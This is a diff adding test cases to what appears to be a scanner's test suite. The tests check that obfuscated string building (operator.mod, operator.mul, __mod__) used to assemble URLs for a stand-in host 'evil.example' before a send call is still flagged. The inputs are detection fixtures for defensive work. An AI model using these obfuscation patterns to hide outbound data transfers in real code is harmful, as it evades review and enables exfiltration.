@@ -4660,6 +4660,24 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
+    # The other two operators that build a string are the same call in
+    # disguise, and folding them means standing the operator back up rather
+    # than repeating its rules: mod, mul, their in-place names and the dunders.
+    for body in (
+        'import operator\n'
+        'url = operator.mod("%s://%s/c", ("https", "evil.example"))\n' + send,
+        'from operator import mod\n'
+        'url = mod("%s://%s/c", ("https", "evil.example"))\n' + send,
+        'import operator\n'
+        'url = operator.mul("https", 1) + "://evil.example/c"\n' + send,
+        'url = "%s://%s/c".__mod__(("https", "evil.example"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+    # The hub through the same call is still the hub.
+    assert scan_converter_source(
+        preamble + 'import operator\nurl = operator.mod("%s/api", HUB)\n' + send
+    ) == []
+
     # And the same function under its own name: from operator import add,
     # aliased, or rebound. set.add is not one of these, since these take two.
     for body in (
